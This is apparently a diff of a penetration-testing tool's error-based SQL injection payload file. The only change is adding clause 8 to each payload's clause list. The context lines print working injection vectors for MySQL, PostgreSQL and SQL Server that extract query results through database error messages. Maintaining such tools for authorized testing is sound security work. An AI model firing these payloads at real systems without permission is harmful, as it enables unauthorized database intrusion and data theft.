@@ -7,7 +7,7 @@
         <stype>2</stype>
         <level>4</level>
         <risk>1</risk>
-        <clause>1,2,3,9</clause>
+        <clause>1,2,3,8,9</clause>
         <where>1</where>
         <vector>AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]','x'))s), 8446744073709551610, 8446744073709551610)))</vector>
         <request>
@@ -32,7 +32,7 @@
         <stype>2</stype>
         <level>4</level>
         <risk>3</risk>
-        <clause>1,9</clause>
+        <clause>1,8,9</clause>
         <where>1</where>
         <vector>OR (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]','x'))s), 8446744073709551610, 8446744073709551610)))</vector>
         <request>
@@ -56,7 +56,7 @@
         <stype>2</stype>
         <level>4</level>
         <risk>1</risk>
-        <clause>1,2,3,9</clause>
+        <clause>1,2,3,8,9</clause>
         <where>1</where>
         <vector>AND EXP(~(SELECT * FROM (SELECT CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]','x'))x))</vector>
         <request>
@@ -76,7 +76,7 @@
         <stype>2</stype>
         <level>4</level>
         <risk>3</risk>
-        <clause>1,9</clause>
+        <clause>1,8,9</clause>
         <where>1</where>
         <vector>OR EXP(~(SELECT * FROM (SELECT CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]','x'))x))</vector>
         <request>
@@ -96,7 +96,7 @@
         <stype>2</stype>
         <level>5</level>
         <risk>1</risk>
-        <clause>1,2,3,9</clause>
+        <clause>1,2,3,8,9</clause>
         <where>1</where>
         <vector>AND JSON_KEYS((SELECT CONVERT((SELECT CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]')) USING utf8)))</vector>
         <request>
@@ -117,7 +117,7 @@
         <stype>2</stype>
         <level>5</level>
         <risk>3</risk>
-        <clause>1,9</clause>
+        <clause>1,8,9</clause>
         <where>1</where>
         <vector>OR JSON_KEYS((SELECT CONVERT((SELECT CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]')) USING utf8)))</vector>
         <request>
@@ -137,7 +137,7 @@
         <stype>2</stype>
         <level>1</level>
         <risk>1</risk>
-        <clause>1,2,3,9</clause>
+        <clause>1,2,3,8,9</clause>
         <where>1</where>
         <vector>AND (SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)</vector>
         <request>
@@ -161,7 +161,7 @@
         <stype>2</stype>
         <level>1</level>
         <risk>3</risk>
-        <clause>1,2,3,9</clause>
+        <clause>1,2,3,8,9</clause>
         <!-- Despite this is an OR payload, keep where to 1 because otherwise it will not work when injecting in ORDER BY or GROUP BY -->
         <where>1</where>
         <vector>OR (SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)</vector>
@@ -186,7 +186,7 @@
         <stype>2</stype>
         <level>2</level>
         <risk>1</risk>
-        <clause>1,2,3,9</clause>
+        <clause>1,2,3,8,9</clause>
         <where>1</where>
         <vector>AND EXTRACTVALUE([RANDNUM],CONCAT('\','[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]'))</vector>
         <request>
@@ -210,7 +210,7 @@
         <stype>2</stype>
         <level>2</level>
         <risk>3</risk>
-        <clause>1,2,3,9</clause>
+        <clause>1,2,3,8,9</clause>
         <!-- Despite this is an OR payload, keep where to 1 because otherwise it will not work when injecting in ORDER BY or GROUP BY -->
         <where>1</where>
         <vector>OR EXTRACTVALUE([RANDNUM],CONCAT('\','[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]'))</vector>
@@ -235,7 +235,7 @@
         <stype>2</stype>
         <level>3</level>
         <risk>1</risk>
-        <clause>1,2,3,9</clause>
+        <clause>1,2,3,8,9</clause>
         <where>1</where>
         <vector>AND UPDATEXML([RANDNUM],CONCAT('.','[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]'),[RANDNUM1])</vector>
         <request>
@@ -259,7 +259,7 @@
         <stype>2</stype>
         <level>3</level>
         <risk>3</risk>
-        <clause>1,2,3,9</clause>
+        <clause>1,2,3,8,9</clause>
         <!-- Despite this is an OR payload, keep where to 1 because otherwise it will not work when injecting in ORDER BY or GROUP BY -->
         <where>1</where>
         <vector>OR UPDATEXML([RANDNUM],CONCAT('.','[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]'),[RANDNUM1])</vector>
@@ -284,7 +284,7 @@
         <stype>2</stype>
         <level>2</level>
         <risk>1</risk>
-        <clause>1,2,3,9</clause>
+        <clause>1,2,3,8,9</clause>
         <where>1</where>
         <vector>AND ROW([RANDNUM],[RANDNUM1])>(SELECT COUNT(*),CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM (SELECT [RANDNUM2] UNION SELECT [RANDNUM3] UNION SELECT [RANDNUM4] UNION SELECT [RANDNUM5])a GROUP BY x)</vector>
         <request>
@@ -309,7 +309,7 @@
         <stype>2</stype>
         <level>2</level>
         <risk>3</risk>
-        <clause>1,9</clause>
+        <clause>1,8,9</clause>
         <where>1</where>
         <vector>OR ROW([RANDNUM],[RANDNUM1])>(SELECT COUNT(*),CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM (SELECT [RANDNUM2] UNION SELECT [RANDNUM3] UNION SELECT [RANDNUM4] UNION SELECT [RANDNUM5])a GROUP BY x)</vector>
         <request>
@@ -334,7 +334,7 @@
         <stype>2</stype>
         <level>3</level>
         <risk>3</risk>
-        <clause>1,9</clause>
+        <clause>1,8,9</clause>
         <where>2</where>
         <vector>OR 1 GROUP BY CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]',FLOOR(RAND(0)*2)) HAVING MIN(0)</vector>
         <request>
@@ -354,7 +354,7 @@
         <stype>2</stype>
         <level>1</level>
         <risk>1</risk>
-        <clause>1,9</clause>
+        <clause>1,8,9</clause>
         <where>1</where>
         <vector>AND [RANDNUM]=CAST('[DELIMITER_START]'||([QUERY])::text||'[DELIMITER_STOP]' AS NUMERIC)</vector>
         <request>
@@ -373,7 +373,7 @@
         <stype>2</stype>
         <level>1</level>
         <risk>3</risk>
-        <clause>1,9</clause>
+        <clause>1,8,9</clause>
         <where>2</where>
         <vector>OR [RANDNUM]=CAST('[DELIMITER_START]'||([QUERY])::text||'[DELIMITER_STOP]' AS NUMERIC)</vector>
         <request>
@@ -392,7 +392,7 @@
         <stype>2</stype>
         <level>1</level>
         <risk>1</risk>
-        <clause>1,9</clause>
+        <clause>1,8,9</clause>
         <where>1</where>
         <vector>AND [RANDNUM] IN (SELECT ('[DELIMITER_START]'+([QUERY])+'[DELIMITER_STOP]'))</vector>
         <request>
@@ -413,7 +413,7 @@
         <stype>2</stype>
         <level>2</level>
         <risk>3</risk>
-        <clause>1,9</clause>
+        <clause>1,8,9</clause>
         <where>2</where>
         <vector>OR [RANDNUM] IN (SELECT ('[DELIMITER_START]'+([QUERY])+'[DELIMITER_STOP]'))</vector>
         <request>
@@ -434,7 +434,7 @@
         <stype>2</stype>
         <level>2</level>
         <risk>1</risk>
-        <clause>1,9</clause>
+        <clause>1,8,9</clause>
         <where>1</where>
         <vector>AND [RANDNUM]=CONVERT(INT,(SELECT '[DELIMITER_START]'+([QUERY])+'[DELIMITER_STOP]'))</vector>
         <request>
@@ -455,7 +455,7 @@
         <stype>2</stype>
         <level>3</level>
         <risk>3</risk>
-        <clause>1,9</clause>
+        <clause>1,8,9</clause>
         <where>2</where>
         <vector>OR [RANDNUM]=CONVERT(INT,(SELECT '[DELIMITER_START]'+([QUERY])+'[DELIMITER_STOP]'))</vector>
         <request>
@@ -476,7 +476,7 @@
         <stype>2</stype>
         <level>2</level>
         <risk>1</risk>
-        <clause>1,9</clause>
+        <clause>1,8,9</clause>
         <where>1</where>
         <vector>AND [RANDNUM]=CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]')</vector>
         <request>
@@ -497,7 +497,7 @@
         <stype>2</stype>
         <level>3</level>
         <risk>3</risk>
-        <clause>1,9</clause>
+        <clause>1,8,9</clause>
         <where>2</where>
         <vector>OR [RANDNUM]=CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]')</vector>
         <request>
